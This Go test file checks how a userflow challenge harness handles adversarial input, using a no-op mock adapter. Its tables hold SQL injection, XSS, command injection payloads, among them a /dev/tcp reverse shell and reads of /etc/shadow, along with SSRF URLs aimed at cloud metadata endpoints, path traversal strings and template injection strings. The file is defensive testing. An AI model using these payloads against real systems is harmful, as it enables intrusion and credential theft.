// Previously tests/security/userflow_security_test.go. CONST-030 forbids
// mocks in non-unit tests; this file wires a local securityMockAPIAdapter
// (no-op HTTP / WebSocket methods) through the userflow harness in
// memory — zero live HelixAgent interaction. PR28 of the CONST-030
// compliance campaign.
package userflow_security_legacy_test

import (
	"context"
	"runtime"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"digital.vasic.challenges/pkg/challenge"
	uf "digital.vasic.challenges/pkg/userflow"

	"dev.helix.agent/internal/challenges/userflow"
)

// Resource limit per CLAUDE.md rule 15.
func init() {
	runtime.GOMAXPROCS(2)
}

// ---------------------------------------------------------------
// Mock adapter for security tests (unit-test only).
// ---------------------------------------------------------------

type securityMockAPIAdapter struct{}

func (m *securityMockAPIAdapter) Login(
	_ context.Context, _ uf.Credentials,
) (string, error) {
	return "", nil
}

func (m *securityMockAPIAdapter) LoginWithRetry(
	_ context.Context, _ uf.Credentials, _ int,
) (string, error) {
	return "", nil
}

func (m *securityMockAPIAdapter) Get(
	_ context.Context, _ string,
) (int, map[string]interface{}, error) {
	return 200, nil, nil
}

func (m *securityMockAPIAdapter) GetRaw(
	_ context.Context, _ string,
) (int, []byte, error) {
	return 200, nil, nil
}

func (m *securityMockAPIAdapter) GetArray(
	_ context.Context, _ string,
) (int, []interface{}, error) {
	return 200, nil, nil
}

func (m *securityMockAPIAdapter) PostJSON(
	_ context.Context, _, _ string,
) (int, []byte, error) {
	return 200, nil, nil
}

func (m *securityMockAPIAdapter) PutJSON(
	_ context.Context, _, _ string,
) (int, []byte, error) {
	return 200, nil, nil
}

func (m *securityMockAPIAdapter) Delete(
	_ context.Context, _ string,
) (int, []byte, error) {
	return 200, nil, nil
}

func (m *securityMockAPIAdapter) DeleteWithBody(
	_ context.Context, _, _ string,
) (int, []byte, error) {
	return 200, nil, nil
}

func (m *securityMockAPIAdapter) WebSocketConnect(
	_ context.Context, _ string,
) (uf.WebSocketConn, error) {
	return nil, nil
}

func (m *securityMockAPIAdapter) SetToken(_ string) {}

func (m *securityMockAPIAdapter) Available(
	_ context.Context,
) bool {
	return false
}

// ---------------------------------------------------------------
// 1. Input validation: SQL injection payloads in flow bodies.
// ---------------------------------------------------------------

func TestAPIStep_Body_SQLInjection(t *testing.T) {
	payloads := []struct {
		name    string
		payload string
	}{
		{
			"classic_or_1_eq_1",
			`' OR 1=1 --`,
		},
		{
			"union_select",
			`' UNION SELECT username, password ` +
				`FROM users --`,
		},
		{
			"drop_table",
			`'; DROP TABLE users; --`,
		},
		{
			"stacked_queries",
			`'; INSERT INTO admin VALUES` +
				`('hacker','pw'); --`,
		},
		{
			"blind_sleep",
			`' OR SLEEP(5) --`,
		},
		{
			"comment_bypass",
			`admin'/**/OR/**/1=1--`,
		},
	}

	for _, tt := range payloads {
		t.Run(tt.name, func(t *testing.T) {
			flow := uf.APIFlow{
				Steps: []uf.APIStep{
					{
						Name:   "sql_injection_" + tt.name,
						Method: "POST",
						Path:   "/v1/chat/completions",
						Body: `{
							"model": "test",
							"messages": [{
								"role": "user",
								"content": "` + tt.payload + `"
							}]
						}`,
						AcceptedStatuses: []int{
							200, 400, 422, 500,
						},
					},
				},
			}

			require.NotEmpty(t, flow.Steps)
			step := flow.Steps[0]
			assert.Contains(t, step.Body, tt.payload,
				"payload must appear in body verbatim")
			assert.Equal(t, "POST", step.Method)
			assert.NotEmpty(t, step.Name)
			assert.NotEmpty(t, step.AcceptedStatuses,
				"SQL injection steps must accept "+
					"error codes")
		})
	}
}

// ---------------------------------------------------------------
// 2. Input validation: XSS payloads in flow bodies.
// ---------------------------------------------------------------

func TestAPIStep_Body_XSSPayloads(t *testing.T) {
	payloads := []struct {
		name    string
		payload string
	}{
		{
			"script_tag",
			`<script>alert('xss')</script>`,
		},
		{
			"img_onerror",
			`<img src=x onerror=alert(1)>`,
		},
		{
			"svg_onload",
			`<svg onload=alert(1)>`,
		},
		{
			"event_handler",
			`<body onload=alert('xss')>`,
		},
		{
			"javascript_uri",
			`<a href="javascript:alert(1)">click</a>`,
		},
		{
			"encoded_script",
			`%3Cscript%3Ealert(1)%3C/script%3E`,
		},
	}

	for _, tt := range payloads {
		t.Run(tt.name, func(t *testing.T) {
			flow := uf.APIFlow{
				Steps: []uf.APIStep{
					{
						Name:   "xss_" + tt.name,
						Method: "POST",
						Path:   "/v1/format",
						Body: `{
							"language": "html",
							"code": "` + tt.payload + `"
						}`,
						AcceptedStatuses: []int{
							200, 400, 422,
						},
					},
				},
			}

			require.Len(t, flow.Steps, 1)
			step := flow.Steps[0]
			assert.Contains(t, step.Body, tt.payload,
				"XSS payload must be in body")
			assert.Equal(t, "POST", step.Method)
		})
	}
}

// ---------------------------------------------------------------
// 3. Input validation: command injection payloads.
// ---------------------------------------------------------------

func TestAPIStep_Body_CommandInjection(t *testing.T) {
	payloads := []struct {
		name    string
		payload string
	}{
		{
			"semicolon_cat",
			`; cat /etc/passwd`,
		},
		{
			"pipe_id",
			`| id`,
		},
		{
			"backtick_whoami",
			"$(whoami)",
		},
		{
			"ampersand_ls",
			`&& ls -la /`,
		},
		{
			"newline_injection",
			"test\ncat /etc/shadow",
		},
		{
			"reverse_shell",
			`; bash -i >& /dev/tcp/10.0.0.1/` +
				`8080 0>&1`,
		},
	}

	for _, tt := range payloads {
		t.Run(tt.name, func(t *testing.T) {
			flow := uf.APIFlow{
				Steps: []uf.APIStep{
					{
						Name:   "cmdinj_" + tt.name,
						Method: "POST",
						Path:   "/v1/chat/completions",
						Body: `{
							"model": "test",
							"messages": [{
								"role": "user",
								"content": "` + tt.payload + `"
							}]
						}`,
						AcceptedStatuses: []int{
							200, 400, 422, 500,
						},
					},
				},
			}

			require.NotEmpty(t, flow.Steps)
			assert.Contains(t, flow.Steps[0].Body,
				tt.payload,
				"command injection payload must "+
					"be in body")
		})
	}
}

// ---------------------------------------------------------------
// 4. Oversized payloads.
// ---------------------------------------------------------------

func TestAPIStep_Body_OversizedPayload(t *testing.T) {
	tests := []struct {
		name string
		size int
	}{
		{"1MB", 1 << 20},
		{"5MB", 5 << 20},
		{"10MB", 10 << 20},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			largeContent := strings.Repeat("A", tt.size)

			flow := uf.APIFlow{
				Steps: []uf.APIStep{
					{
						Name:   "oversized_" + tt.name,
						Method: "POST",
						Path:   "/v1/chat/completions",
						Body: `{
							"model": "test",
							"messages": [{
								"role": "user",
								"content": "` + largeContent + `"
							}]
						}`,
						AcceptedStatuses: []int{
							200, 400, 413, 422, 500,
						},
					},
				},
			}

			require.Len(t, flow.Steps, 1)
			step := flow.Steps[0]
			assert.Greater(t, len(step.Body), tt.size,
				"body must contain the oversized "+
					"payload")
			assert.Contains(t,
				step.AcceptedStatuses, 413,
				"should accept 413 Payload Too "+
					"Large")
		})
	}
}

// ---------------------------------------------------------------
// 5. Invalid baseURL: SSRF-style URLs.
// ---------------------------------------------------------------

func TestOrchestrator_InvalidBaseURL_SSRF(
	t *testing.T,
) {
	ssrfURLs := []struct {
		name string
		url  string
	}{
		{
			"file_protocol",
			"file:///etc/passwd",
		},
		{
			"localhost_127",
			"http://127.0.0.1:22",
		},
		{
			"localhost_name",
			"http://localhost:6379",
		},
		{
			"internal_ip_10",
			"http://10.0.0.1:8080",
		},
		{
			"internal_ip_172",
			"http://172.16.0.1:9200",
		},
		{
			"internal_ip_192",
			"http://192.168.1.1:80",
		},
		{
			"ipv6_localhost",
			"http://[::1]:8080",
		},
		{
			"metadata_aws",
			"http://169.254.169.254/latest/meta-data/",
		},
		{
			"metadata_gcp",
			"http://metadata.google.internal/" +
				"computeMetadata/v1/",
		},
		{
			"zero_ip",
			"http://0.0.0.0:8080",
		},
	}

	for _, tt := range ssrfURLs {
		t.Run(tt.name, func(t *testing.T) {
			// NewOrchestrator accepts any string as
			// baseURL. We verify construction succeeds
			// but the URL is stored correctly so that
			// downstream validation can block it.
			o, oErr := userflow.NewOrchestrator(tt.url)
			require.NoError(t, oErr,
				"orchestrator creation must not fail "+
					"on SSRF URL")
			require.NotNil(t, o,
				"orchestrator must not be nil "+
					"on SSRF URL")
			assert.Greater(t, o.ChallengeCount(), 0,
				"challenges must still register")
			assert.Contains(t, o.Summary(), tt.url,
				"summary must reflect the "+
					"configured URL")
		})
	}
}

// ---------------------------------------------------------------
// 6. Malicious challenge IDs: path traversal and special chars.
// ---------------------------------------------------------------

func TestAPIFlowChallenge_MaliciousID(t *testing.T) {
	var adapter securityMockAPIAdapter

	maliciousIDs := []struct {
		name string
		id   string
	}{
		{
			"path_traversal_unix",
			"../../etc/passwd",
		},
		{
			"path_traversal_windows",
			`..\..\windows\system32`,
		},
		{
			"null_byte",
			"challenge\x00injected",
		},
		{
			"url_encoded_traversal",
			"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		},
		{
			"spaces_and_special",
			"challenge <script>alert(1)</script>",
		},
		{
			"unicode_homoglyph",
			"helix-health-\u0441heck",
		},
		{
			"very_long_id",
			strings.Repeat("x", 10000),
		},
		{
			"empty_id",
			"",
		},
		{
			"slash_only",
			"///",
		},
		{
			"newline_in_id",
			"challenge\ninjected",
		},
	}

	for _, tt := range maliciousIDs {
		t.Run(tt.name, func(t *testing.T) {
			flow := uf.APIFlow{
				Steps: []uf.APIStep{
					{
						Name:           "step1",
						Method:         "GET",
						Path:           "/health",
						ExpectedStatus: 200,
					},
				},
			}

			c := uf.NewAPIFlowChallenge(
				tt.id,
				"Malicious ID Test",
				"Test with malicious ID: "+tt.name,
				nil,
				&adapter,
				flow,
			)

			require.NotNil(t, c,
				"constructor must not panic")
			assert.Equal(t,
				challenge.ID(tt.id), c.ID(),
				"ID must be stored as-is")
		})
	}
}

// ---------------------------------------------------------------
// 7. Concurrent registration safety.
// ---------------------------------------------------------------

func TestOrchestrator_ConcurrentConstruction(
	t *testing.T,
) {
	const goroutines = 20
	var wg sync.WaitGroup
	wg.Add(goroutines)

	errs := make(chan interface{}, goroutines)

	for i := 0; i < goroutines; i++ {
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					errs <- r
				}
			}()

			o, oErr := userflow.NewOrchestrator(
				"http://localhost:8100",
			)
			if oErr != nil {
				errs <- oErr
				return
			}
			if o == nil {
				errs <- "nil orchestrator"
			}
		}()
	}

	wg.Wait()
	close(errs)

	for err := range errs {
		t.Errorf(
			"concurrent construction error: %v",
			err,
		)
	}
}

func TestOrchestrator_ConcurrentListChallenges(
	t *testing.T,
) {
	o, err := userflow.NewOrchestrator(
		"http://localhost:8100",
	)
	require.NoError(t, err)
	require.NotNil(t, o)

	const goroutines = 50
	var wg sync.WaitGroup
	wg.Add(goroutines)

	results := make(chan []string, goroutines)

	for i := 0; i < goroutines; i++ {
		go func() {
			defer wg.Done()
			results <- o.ListChallenges()
		}()
	}

	wg.Wait()
	close(results)

	expectedCount := o.ChallengeCount()
	for ids := range results {
		assert.Len(t, ids, expectedCount,
			"concurrent reads must return "+
				"consistent count")
	}
}

// ---------------------------------------------------------------
// 8. Nil/empty adapter handling.
// ---------------------------------------------------------------

func TestChallengeConstructor_NilAdapter(
	t *testing.T,
) {
	// Passing nil adapter should not panic during
	// construction. Execution would fail at runtime,
	// but the struct must be safely constructed.
	constructors := []struct {
		name string
		fn   func() *uf.APIFlowChallenge
	}{
		{
			"HealthCheck",
			func() *uf.APIFlowChallenge {
				return userflow.NewHealthCheckChallenge(
					nil,
				)
			},
		},
		{
			"FeatureFlags",
			func() *uf.APIFlowChallenge {
				return userflow.NewFeatureFlagsChallenge(
					nil,
				)
			},
		},
		{
			"FullSystem",
			func() *uf.APIFlowChallenge {
				return userflow.NewFullSystemChallenge(
					nil,
				)
			},
		},
		{
			"Monitoring",
			func() *uf.APIFlowChallenge {
				return userflow.NewMonitoringChallenge(
					nil, nil,
				)
			},
		},
		{
			"ErrorHandling",
			func() *uf.APIFlowChallenge {
				return userflow.NewErrorHandlingChallenge(
					nil, nil,
				)
			},
		},
		{
			"Authentication",
			func() *uf.APIFlowChallenge {
				return userflow.NewAuthenticationChallenge(
					nil, nil,
				)
			},
		},
	}

	for _, tt := range constructors {
		t.Run(tt.name, func(t *testing.T) {
			assert.NotPanics(t, func() {
				c := tt.fn()
				require.NotNil(t, c,
					"nil adapter must not "+
						"prevent construction")
				assert.NotEmpty(t, string(c.ID()),
					"ID must be set")
			})
		})
	}
}

// ---------------------------------------------------------------
// 9. Flow structural integrity with malicious data.
// ---------------------------------------------------------------

func TestFlowSteps_NoPathTraversalInPaths(
	t *testing.T,
) {
	flows := []struct {
		name string
		flow uf.APIFlow
	}{
		{"HealthCheck", userflow.HealthCheckFlow()},
		{"ChatCompletion",
			userflow.ChatCompletionFlow()},
		{"Streaming",
			userflow.StreamingCompletionFlow()},
		{"Embeddings", userflow.EmbeddingsFlow()},
		{"Formatters", userflow.FormattersFlow()},
		{"Debate", userflow.DebateFlow()},
		{"Monitoring", userflow.MonitoringFlow()},
		{"MCP", userflow.MCPProtocolFlow()},
		{"RAG", userflow.RAGFlow()},
		{"FeatureFlags", userflow.FeatureFlagsFlow()},
		{"Authentication",
			userflow.AuthenticationFlow()},
		{"ErrorHandling",
			userflow.ErrorHandlingFlow()},
		{"ConcurrentUsers",
			userflow.ConcurrentUsersFlow()},
		{"FullSystem", userflow.FullSystemFlow()},
		{"MultiTurn",
			userflow.MultiTurnConversationFlow()},
		{"ToolCalling", userflow.ToolCallingFlow()},
		{"ProviderFailover",
			userflow.ProviderFailoverFlow()},
		{"ProviderDiscovery",
			userflow.ProviderDiscoveryFlow("")},
		{"WebSocketStreaming",
			userflow.WebSocketStreamingFlow()},
		{"GRPCService",
			userflow.GRPCServiceFlow()},
		{"RateLimiting",
			userflow.RateLimitingFlow()},
		{"Pagination",
			userflow.PaginationFlow()},
	}

	for _, tt := range flows {
		t.Run(tt.name, func(t *testing.T) {
			for _, step := range tt.flow.Steps {
				assert.NotContains(t,
					step.Path, "..",
					"step %q path must not "+
						"contain path traversal",
					step.Name,
				)
				assert.True(t,
					strings.HasPrefix(
						step.Path, "/",
					),
					"step %q path must start "+
						"with /",
					step.Name,
				)
				assert.NotContains(t,
					step.Path, "\x00",
					"step %q path must not "+
						"contain null bytes",
					step.Name,
				)
			}
		})
	}
}

// ---------------------------------------------------------------
// 10. Flow methods are restricted to safe HTTP verbs.
// ---------------------------------------------------------------

func TestFlowSteps_SafeHTTPMethods(t *testing.T) {
	allowedMethods := map[string]bool{
		"GET":    true,
		"POST":   true,
		"PUT":    true,
		"DELETE": true,
		"PATCH":  true,
	}

	flows := []struct {
		name string
		flow uf.APIFlow
	}{
		{"HealthCheck", userflow.HealthCheckFlow()},
		{"ChatCompletion",
			userflow.ChatCompletionFlow()},
		{"Streaming",
			userflow.StreamingCompletionFlow()},
		{"Embeddings", userflow.EmbeddingsFlow()},
		{"Formatters", userflow.FormattersFlow()},
		{"Debate", userflow.DebateFlow()},
		{"Monitoring", userflow.MonitoringFlow()},
		{"MCP", userflow.MCPProtocolFlow()},
		{"RAG", userflow.RAGFlow()},
		{"FeatureFlags", userflow.FeatureFlagsFlow()},
		{"Authentication",
			userflow.AuthenticationFlow()},
		{"ErrorHandling",
			userflow.ErrorHandlingFlow()},
		{"ConcurrentUsers",
			userflow.ConcurrentUsersFlow()},
		{"FullSystem", userflow.FullSystemFlow()},
		{"MultiTurn",
			userflow.MultiTurnConversationFlow()},
		{"ToolCalling", userflow.ToolCallingFlow()},
		{"ProviderFailover",
			userflow.ProviderFailoverFlow()},
		{"ProviderDiscovery",
			userflow.ProviderDiscoveryFlow("")},
		{"WebSocketStreaming",
			userflow.WebSocketStreamingFlow()},
		{"GRPCService",
			userflow.GRPCServiceFlow()},
		{"RateLimiting",
			userflow.RateLimitingFlow()},
		{"Pagination",
			userflow.PaginationFlow()},
	}

	for _, tt := range flows {
		t.Run(tt.name, func(t *testing.T) {
			for _, step := range tt.flow.Steps {
				assert.True(t,
					allowedMethods[step.Method],
					"step %q uses disallowed "+
						"method %q",
					step.Name, step.Method,
				)
			}
		})
	}
}

// ---------------------------------------------------------------
// 11. Accepted status codes are within valid HTTP range.
// ---------------------------------------------------------------

func TestFlowSteps_ValidStatusCodes(t *testing.T) {
	flows := []struct {
		name string
		flow uf.APIFlow
	}{
		{"HealthCheck", userflow.HealthCheckFlow()},
		{"ChatCompletion",
			userflow.ChatCompletionFlow()},
		{"Streaming",
			userflow.StreamingCompletionFlow()},
		{"ErrorHandling",
			userflow.ErrorHandlingFlow()},
		{"Authentication",
			userflow.AuthenticationFlow()},
		{"ProviderFailover",
			userflow.ProviderFailoverFlow()},
		{"FullSystem", userflow.FullSystemFlow()},
	}

	for _, tt := range flows {
		t.Run(tt.name, func(t *testing.T) {
			for _, step := range tt.flow.Steps {
				if step.ExpectedStatus > 0 {
					assert.GreaterOrEqual(t,
						step.ExpectedStatus, 100,
						"step %q: status < 100",
						step.Name,
					)
					assert.LessOrEqual(t,
						step.ExpectedStatus, 599,
						"step %q: status > 599",
						step.Name,
					)
				}
				for _, code := range step.AcceptedStatuses {
					assert.GreaterOrEqual(t,
						code, 100,
						"step %q: accepted "+
							"status < 100",
						step.Name,
					)
					assert.LessOrEqual(t,
						code, 599,
						"step %q: accepted "+
							"status > 599",
						step.Name,
					)
				}
			}
		})
	}
}

// ---------------------------------------------------------------
// 12. Variable extraction keys do not allow injection.
// ---------------------------------------------------------------

func TestFlowSteps_ExtractTo_NoInjection(
	t *testing.T,
) {
	flows := []struct {
		name string
		flow uf.APIFlow
	}{
		{"Debate", userflow.DebateFlow()},
		{"Authentication",
			userflow.AuthenticationFlow()},
	}

	dangerousChars := []string{
		"..", "/", "\\", "\x00", ";", "|", "&",
		"`", "$(",
	}

	for _, tt := range flows {
		t.Run(tt.name, func(t *testing.T) {
			for _, step := range tt.flow.Steps {
				for field, varName := range step.ExtractTo {
					for _, dc := range dangerousChars {
						assert.NotContains(t,
							field, dc,
							"step %q extract "+
								"field %q "+
								"contains %q",
							step.Name, field, dc,
						)
						assert.NotContains(t,
							varName, dc,
							"step %q extract "+
								"var %q "+
								"contains %q",
							step.Name,
							varName, dc,
						)
					}
				}
			}
		})
	}
}

// ---------------------------------------------------------------
// 13. Challenge ID uniqueness across all flows.
// ---------------------------------------------------------------

func TestOrchestrator_NoDuplicateChallengeIDs(
	t *testing.T,
) {
	o, err := userflow.NewOrchestrator(
		"http://localhost:8100",
	)
	require.NoError(t, err)
	require.NotNil(t, o)

	ids := o.ListChallenges()
	seen := make(map[string]bool, len(ids))
	for _, id := range ids {
		assert.False(t, seen[id],
			"duplicate challenge ID: %s", id)
		seen[id] = true
	}
}

// ---------------------------------------------------------------
// 14. Bodies with embedded template injection patterns.
// ---------------------------------------------------------------

func TestAPIStep_Body_TemplateInjection(
	t *testing.T,
) {
	payloads := []struct {
		name    string
		payload string
	}{
		{
			"go_template",
			`{{.Exec "id"}}`,
		},
		{
			"jinja2_template",
			`{{ config.items() }}`,
		},
		{
			"ssti_basic",
			`{{7*7}}`,
		},
		{
			"freemarker",
			`${"freemarker.template.utility` +
				`.Execute"?new()("id")}`,
		},
	}

	for _, tt := range payloads {
		t.Run(tt.name, func(t *testing.T) {
			flow := uf.APIFlow{
				Steps: []uf.APIStep{
					{
						Name:   "ssti_" + tt.name,
						Method: "POST",
						Path:   "/v1/chat/completions",
						Body: `{
							"model": "test",
							"messages": [{
								"role": "user",
								"content": "` + tt.payload + `"
							}]
						}`,
						AcceptedStatuses: []int{
							200, 400, 422, 500,
						},
					},
				},
			}

			require.Len(t, flow.Steps, 1)
			assert.NotEmpty(t, flow.Steps[0].Body)
		})
	}
}

// ---------------------------------------------------------------
// 15. Orchestrator summary does not leak sensitive data.
// ---------------------------------------------------------------

func TestOrchestrator_Summary_NoSensitiveLeak(
	t *testing.T,
) {
	o, err := userflow.NewOrchestrator(
		"http://localhost:8100",
	)
	require.NoError(t, err)
	summary := o.Summary()

	sensitivePatterns := []string{
		"password", "secret", "token",
		"api_key", "apikey", "credential",
	}
	lowerSummary := strings.ToLower(summary)
	for _, pattern := range sensitivePatterns {
		assert.NotContains(t,
			lowerSummary, pattern,
			"summary must not leak %q", pattern,
		)
	}
}

// ---------------------------------------------------------------
// 16. Verify all flow bodies contain valid JSON structure
//     even with adversarial content.
// ---------------------------------------------------------------

func TestFlowSteps_BodiesContainValidJSONKeys(
	t *testing.T,
) {
	flowsWithBodies := []struct {
		name string
		flow uf.APIFlow
	}{
		{"ChatCompletion",
			userflow.ChatCompletionFlow()},
		{"Streaming",
			userflow.StreamingCompletionFlow()},
		{"Embeddings", userflow.EmbeddingsFlow()},
		{"Debate", userflow.DebateFlow()},
		{"RAG", userflow.RAGFlow()},
		{"ToolCalling", userflow.ToolCallingFlow()},
	}

	for _, tt := range flowsWithBodies {
		t.Run(tt.name, func(t *testing.T) {
			for _, step := range tt.flow.Steps {
				if step.Body == "" {
					continue
				}
				assert.True(t,
					strings.Contains(
						step.Body, "{",
					),
					"step %q body must be "+
						"JSON object",
					step.Name,
				)
				assert.True(t,
					strings.Contains(
						step.Body, "}",
					),
					"step %q body must close "+
						"JSON object",
					step.Name,
				)
			}
		})
	}
}
